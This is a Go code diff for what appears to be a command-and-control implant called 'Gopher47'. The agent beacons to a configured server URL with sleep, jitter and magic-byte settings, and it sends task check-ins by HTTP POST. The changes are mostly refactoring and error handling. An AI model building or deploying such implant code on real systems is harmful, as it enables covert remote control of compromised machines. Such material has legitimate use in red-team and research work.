@@ -21,15 +21,18 @@ import (
 
 // Globals
 // Only HTTP for now
-var c = utils.GetConfig()
-var url = c.Url
-var sleepTime = c.SleepTime
-var jitterRange = c.JitterRange
-var magicBytes = []byte("\x63\x61\x66\x65")
-var timeoutThreshold = c.TimeoutThreshold
-var timeoutCounter = -1
-// agentId set in main() because random seeding
-var agentId = ""
+var (
+	c = utils.GetConfig()
+	url = c.Url
+	sleepTime = c.SleepTime
+	jitterRange = c.JitterRange
+	magicBytes = []byte("\x67\x6f\x67\x6f")
+	timeoutThreshold = c.TimeoutThreshold
+	timeoutCounter = -1
+	// agentId set in main() because random seeding
+	agentId = ""
+)
+
 
 func checkError(e error){
 	if e != nil {
@@ -113,7 +116,7 @@ func checkIn(dat string, checkInType string) string{
 	requestDat := `{"task":"`+checkInType+`","data":"` + string(dat) + `"}`
 
 	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
-	size := len(requestDat)+12
+	size := len(requestDat) + 12
 	sizeBytes := make([]byte, 4)
 	binary.BigEndian.PutUint32(sizeBytes, uint32(size))
 
@@ -124,7 +127,7 @@ func checkIn(dat string, checkInType string) string{
 
 	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
-	if os.IsTimeout(err){
+	if os.IsTimeout(err) || err != nil {
 		timeoutCounter += 1
 	} else {
 		timeoutCounter = 0
@@ -215,7 +218,7 @@ func main(){
 		}
 	}
 	timeoutCounter = 0
-	//fmt.Println("[+] Gopher47 has checked in!")
+	//log.Println("[+] Gopher47 has checked in!")
 
 	command := ""
 	out := ""
